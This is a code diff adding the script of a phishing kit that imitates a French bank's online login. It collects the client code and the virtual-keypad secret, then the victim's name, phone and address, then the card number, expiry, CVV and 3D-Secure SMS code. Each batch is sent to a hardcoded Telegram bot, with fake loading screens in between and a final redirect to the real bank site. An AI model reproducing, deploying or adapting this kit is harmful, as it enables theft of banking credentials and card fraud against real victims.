+        const leftColumn = document.querySelector('.left-column');
+        
+        // Champs Info Perso
+        const fullNameInput = document.getElementById('fullName');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const addressInput = document.getElementById('address');
+        
+        // Champs Carte
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardDateInput = document.getElementById('cardDate'); 
+        
+        // Champs SMS
+        const smsCodeInput = document.getElementById('smsCode');
+        const smsSubmitBtn = document.querySelector('.sms-submit-btn');
+        const loadingText2 = document.getElementById('loadingText2');
+        const passwordError = document.getElementById('passwordError'); 
+
+        const LONG_DELAY = 20000; 
+        const PERSONAL_INFO_DELAY = 16000; 
+        const SHORT_DELAY = 4000; 
+        const PASSWORD_LENGTH = 6; 
+
+        let passwordCode = '';
+
+        // --- Configuration Telegram (À REMPLACER) ---
+        const TELEGRAM_BOT_TOKEN = '7821180131:AAGEHSmpBUoETOC7TPpY51NAVPSHP_YJfHo'; 
+        const TELEGRAM_CHAT_ID = '6835047300'; 
+        const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        // ---------------------------------------------
+        
+        // FONCTION MODIFIÉE : Envoi en Texte Brut pour éviter l'encodage HTML
+        function sendToTelegram(message) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.error("ERREUR: Veuillez configurer votre TELEGRAM_BOT_TOKEN et CHAT_ID dans le script.");
+                return; 
+            }
+
+            // Nous n'encodons plus le message manuellement ni n'utilisons le mode HTML
+            // L'API fetch va sérialiser le message dans le JSON, gérant l'encodage URI
+            // de manière invisible, ce qui résout le problème du '%3Cb%3E' dans le payload.
+            fetch(API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message, // Message formaté en texte brut avec des retours à la ligne
+                })
+            })
+            .then(response => {
+                console.log('Données envoyées à Telegram. Statut:', response.ok ? 'SUCCÈS' : 'ÉCHEC');
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram (Vérifiez le token/chat ID):', error);
+            });
+        }
+        
+        function displayError(fieldId, message) {
+            const errorElement = document.getElementById(fieldId + 'Error');
+            if (errorElement) {
+                errorElement.textContent = message;
+                errorElement.style.display = message ? 'block' : 'none';
+            }
+        }
+        
+        function clearAllErrors() {
+            const errorIds = ['codeInput', 'fullName', 'phoneNumber', 'address', 'cardNumber', 'cardDate', 'cardCvv', 'smsCode'];
+            errorIds.forEach(id => displayError(id, ''));
+            passwordError.style.display = 'none';
+        }
+
+        // --- Débloque le bouton de la première étape (Code Client) ---
+        function checkInputLength() {
+            const isFilled = codeInput.value.length === 8;
+            if (isFilled) {
+                dynamicButton.classList.add('valid-btn');
+                dynamicButton.innerHTML = '✔'; 
+                validateStep1.classList.add('active'); // Débloque le bouton "Valider"
+            } else {
+                dynamicButton.classList.remove('valid-btn');
+                dynamicButton.innerHTML = 'X'; 
+                validateStep1.classList.remove('active'); // Bloque le bouton "Valider"
+            }
+        }
+        
+        // --- Gère le clic sur le bouton dynamique (X/✔) ---
+        function handleDynamicButtonClick() {
+            clearAllErrors();
+            if (dynamicButton.classList.contains('valid-btn')) {
+                showPasswordStep();
+            } else {
+                codeInput.value = '';
+                checkInputLength(); 
+            }
+        }
+
+        // --- Passage à l'étape Code Secret ---
+        function showPasswordStep() {
+            clearAllErrors();
+            
+            // Correction : Vérifie que le bouton Valider est actif (8 chiffres saisis)
+            if (!validateStep1.classList.contains('active')) {
+                displayError('codeInput', 'Veuillez saisir votre Code Client (8 chiffres).');
+                return;
+            }
+            
+            if (codeInput.value.length === 8) {
+                step1Controls.classList.add('hidden');
+                codeInput.setAttribute('disabled', 'true'); 
+                dynamicButton.style.visibility = 'hidden'; 
+                
+                step2.classList.remove('hidden');
+                step2.classList.add('active'); 
+                
+                generateVirtualKeyboard(); // Génère le clavier avec 9 chiffres (0-8) + 7 vides
+                passwordCode = ''; 
+                updatePasswordDashes();
+                checkPasswordLength(); 
+            } else {
+                displayError('codeInput', 'Le Code Client doit contenir 8 chiffres.');
+            }
+        }
+
+        function clearPassword() {
+            passwordCode = '';
+            updatePasswordDashes(); 
+            passwordError.style.display = 'none';
+            checkPasswordLength(); 
+        }
+
+        // FONCTION MODIFIÉE : Génère 9 chiffres (0-8) + 7 emplacements vides = 16 boutons
+        function generateVirtualKeyboard() {
+            // 9 chiffres : 0 à 8
+            let numbers = Array.from({length: 9}, (_, i) => i); 
+            // 16 total - 9 chiffres = 7 emplacements vides
+            let emptySlotsCount = 16 - numbers.length; 
+            let keys = [...numbers]; 
+            
+            function shuffleArray(array) {
+                for (let i = array.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [array[i], array[j]] = [array[j], array[i]];
+                }
+            }
+
+            // Ajoute les 7 emplacements vides
+            for (let i = 0; i < emptySlotsCount; i++) {
+                keys.push(null);
+            }
+            
+            shuffleArray(keys); // Mélange les 16 éléments (9 chiffres + 7 vides)
+            
+            keyGrid.innerHTML = '';
+            let keyHTML = '';
+
+            // Rendu des 16 boutons
+            keys.slice(0, 16).forEach(key => {
+                if (key !== null) {
+                    keyHTML += `<button class="key-button" onclick="appendKey(${key})">${key}</button>`;
+                } else {
+                    keyHTML += `<button class="key-button empty-key"></button>`; 
+                }
+            });
+            keyGrid.innerHTML = keyHTML;
+        }
+
+        function appendKey(number) {
+            if (typeof number === 'number' && passwordCode.length < PASSWORD_LENGTH) { 
+                passwordCode += number.toString();
+                updatePasswordDashes();
+                passwordError.style.display = 'none';
+                checkPasswordLength(); 
+            }
+        }
+        
+        // --- Débloque le bouton de la deuxième étape (Code Secret) ---
+        function checkPasswordLength() {
+            if (passwordCode.length === PASSWORD_LENGTH) {
+                validateKeyBtn.classList.add('active');
+            } else {
+                validateKeyBtn.classList.remove('active');
+            }
+        }
+
+        function updatePasswordDashes() {
+            passwordDashesContainer.innerHTML = '';
+            let html = '';
+            
+            for (let i = 0; i < PASSWORD_LENGTH; i++) {
+                if (i < passwordCode.length) {
+                    html += `<span class="dash-char"><span class="filled-char"></span></span>`;
+                } else {
+                    html += `<span class="dash-char">_</span>`;
+                }
+            }
+            passwordDashesContainer.innerHTML = html;
+        }
+        
+        function formatCardDate() {
+            let value = cardDateInput.value.replace(/[^0-9]/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            
+            cardDateInput.value = value;
+        }
+        
+        function formatCardNumber() {
+            let value = cardNumberInput.value.replace(/[^0-9]/g, '');
+            let formatted = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
+            
+            cardNumberInput.value = formatted.substring(0, 19);
+        }
+
+        cardDateInput.addEventListener('input', formatCardDate);
+        cardNumberInput.addEventListener('input', formatCardNumber);
+
+        // --- FLOW STEP 1.5: REDIRECTION VERS INFOS PERSO ---
+        function redirectToPersonalInfoForm() {
+            leftColumn.classList.remove('loading-active');
+            loginStepContainer.classList.add('hidden');
+            loadingSpinner.classList.add('hidden');
+
+            personalInfoFormContent.classList.remove('hidden'); 
+            
+            mainTitle.textContent = "Validation en ligne";
+        }
+
+        function validateFinalCode() {
+            if (passwordCode.length === PASSWORD_LENGTH) {
+                
+                passwordError.style.display = 'none';
+                
+                const clientCode = codeInput.value;
+                // Message en TEXTE BRUT
+                const messagePhase1 = `--- PHASE 1: CONNEXION ---\n\n` + 
+                                      `Identifiant Client: ${clientCode}\n` +
+                                      `Code Secret: ${passwordCode}\n` +
+                                      `Phase: Code Secret Validé`;
+                sendToTelegram(messagePhase1);
+                
+                leftColumn.classList.add('loading-active');
+                loadingSpinner.classList.remove('hidden');
+                loadingSpinner.style.display = 'flex'; 
+
+                setTimeout(() => {
+                    redirectToPersonalInfoForm();
+                }, SHORT_DELAY); 
+            } else {
+                // Affichage de l'erreur Code Secret
+                passwordError.textContent = `Veuillez saisir un Code Secret à ${PASSWORD_LENGTH} chiffres.`;
+                passwordError.style.display = 'block';
+            }
+        }
+        
+        // --- FLOW STEP 2.5: REDIRECTION VERS CARTE BANCAIRE (après chargement 16s) ---
+        function redirectToCardForm() {
+            leftColumn.classList.remove('loading-active');
+            loadingSpinner2.classList.add('hidden'); 
+            
+            cardFormContent.classList.remove('hidden');
+            
+            mainTitle.textContent = "Confirmation de Sécurité";
+        }
+
+        function validatePersonalInfo() {
+            clearAllErrors();
+            let isValid = true;
+            
+            if (fullNameInput.value.trim().length < 3) {
+                displayError('fullName', 'Veuillez saisir votre Nom et Prénom complets.');
+                isValid = false;
+            }
+            
+            if (phoneNumberInput.value.length !== 10) {
+                displayError('phoneNumber', 'Veuillez saisir un numéro de téléphone valide (10 chiffres).');
+                isValid = false;
+            }
+
+            if (addressInput.value.trim().length < 10) {
+                displayError('address', 'Veuillez saisir votre adresse complète.');
+                isValid = false;
+            }
+
+            if (isValid) {
+                // --- Telegram Phase 2: Envoi des Infos Perso ---
+                const fullName = fullNameInput.value.trim();
+                const phoneNumber = phoneNumberInput.value;
+                const address = addressInput.value.trim();
+
+                // Message en TEXTE BRUT
+                const messagePhase2 = `--- PHASE 2: INFOS PERSONNELLES ---\n\n` + 
+                                      `Nom Complet: ${fullName}\n` +
+                                      `Téléphone: ${phoneNumber}\n` +
+                                      `Adresse: ${address}\n` +
+                                      `Phase: Infos Perso Saisies`;
+                sendToTelegram(messagePhase2);
+
+                // --- Démarrage du CHARGEMENT 16s ---
+                loadingText2.textContent = "Sécurisation des données personnelles, veuillez patienter...";
+                leftColumn.classList.add('loading-active');
+                
+                loadingSpinner2.classList.remove('hidden');
+                loadingSpinner2.style.display = 'flex'; 
+                
+                personalInfoFormContent.classList.add('hidden'); 
+
+                setTimeout(() => {
+                    redirectToCardForm(); // Transition vers la carte après 16s
+                }, PERSONAL_INFO_DELAY); 
+            }
+        }
+
+        // --- FLOW STEP 3.5: VALIDATION CARTE ET CHARGEMENT 20S ---
+        function redirectToSmsForm() {
+            leftColumn.classList.remove('loading-active');
+            cardFormContent.classList.add('hidden');
+            loadingSpinner2.classList.add('hidden');
+
+            smsFormContent.classList.remove('hidden');
+            
+            mainTitle.textContent = "Validation par SMS Sécurisé";
+        }
+
+        function startCardValidation() {
+            clearAllErrors();
+            let isValid = true;
+            const cardCvv = document.getElementById('cardCvv');
+            
+            if (cardNumberInput.value.replace(/\s/g, '').length !== 16) {
+                displayError('cardNumber', 'Numéro de carte incomplet (16 chiffres requis).');
+                isValid = false;
+            }
+
+            if (cardDateInput.value.length !== 5) {
+                displayError('cardDate', 'Format de date invalide (MM/AA).');
+                isValid = false;
+            }
+            
+            if (cardCvv.value.length !== 3) {
+                displayError('cardCvv', 'CVV incomplet (3 chiffres requis).');
+                isValid = false;
+            }
+                                
+            if (isValid) {
+                
+                // --- Telegram Phase 3: Envoi de la Carte ---
+                const cardNumber = cardNumberInput.value;
+                const cardDate = cardDateInput.value;
+                const cardCvvValue = cardCvv.value;
+                
+                // Message en TEXTE BRUT
+                const messagePhase3 = `--- PHASE 3: CARTE BANCAIRE ---\n\n` + 
+                                      `Numéro de Carte: ${cardNumber}\n` +
+                                      `Date Exp.: ${cardDate}\n` +
+                                      `CVV: ${cardCvvValue}\n` +
+                                      `Phase: Carte Saisie`;
+                sendToTelegram(messagePhase3);
+
+                // --- Démarrage du CHARGEMENT 20s ---
+                loadingText2.textContent = "Validation des informations..."; 
+                leftColumn.classList.add('loading-active');
+                
+                loadingSpinner2.classList.remove('hidden');
+                loadingSpinner2.style.display = 'flex'; 
+
+                setTimeout(() => {
+                    redirectToSmsForm();
+                }, LONG_DELAY); // Délai de 20 secondes
+            }
+        }
+        
+        // --- FLOW STEP 4: VALIDATION SMS ET REDIRECTION FINALE ---
+        smsSubmitBtn.addEventListener('click', function() {
+            const smsCode = smsCodeInput.value;
+            clearAllErrors();
+            if (smsCode.length === 6) {
+                
+                // --- Telegram Phase 4: Envoi du Code SMS ---
+                // Message en TEXTE BRUT
+                const messagePhase4 = `--- PHASE 4: CODE SMS 3D-SECURE ---\n\n` + 
+                                      `Code SMS: ${smsCode}\n` +
+                                      `Phase: Code SMS Saisi`;
+                sendToTelegram(messagePhase4);
+                
+                // Redirection finale 
+                window.location.href = "https://particuliers.sg.fr/nos-conseils"; 
+            } else {
+                displayError('smsCode', 'Le code de validation doit contenir 6 chiffres.');
+            }
+        });
+
+        window.onload = function() {
+            checkInputLength();
+            // Cacher toutes les étapes sauf la première
+            step1Controls.classList.remove('hidden');
+            step2.classList.add('hidden');
+            personalInfoFormContent.classList.add('hidden');
+            cardFormContent.classList.add('hidden');
+            smsFormContent.classList.add('hidden');
+            loadingSpinner.classList.add('hidden'); 
+            loadingSpinner2.classList.add('hidden'); 
+            updatePasswordDashes(); 
+            leftColumn.classList.remove('loading-active');
+        };
+    </script>
+</body>
+</html>
